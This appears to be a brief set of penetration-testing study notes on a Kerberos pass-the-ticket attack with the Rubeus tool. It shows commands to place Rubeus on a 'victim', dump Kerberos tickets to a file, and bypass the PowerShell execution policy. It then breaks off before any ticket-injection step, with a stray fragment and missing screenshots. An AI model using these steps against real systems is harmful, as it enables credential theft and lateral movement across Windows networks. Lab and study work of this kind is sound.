# Pass The Ticket using Rubeus

1

Install Rubeus

apt install rubeus

2

`┌──(root㉿kali)-[/home/kali]
└─# cd /usr/share/windows-resources/rubeus`

3

Transfer rubeus kali to  victim

![Screenshot From 2026-07-18 11-47-14.png](Pass%20The%20Ticket%20using%20Rubeus/Screenshot_From_2026-07-18_11-47-14.png)

4

```markup
Rubeus.exe dump > pttfile.txt
Rubeus.exe dump
```

5

```mermaid
powershell -ep bypass
```

![Screenshot From 2026-07-18 12-15-06.png](Pass%20The%20Ticket%20using%20Rubeus/Screenshot_From_2026-07-18_12-15-06.png)

6

From GROK , WITHOUT SPACE, IN KALI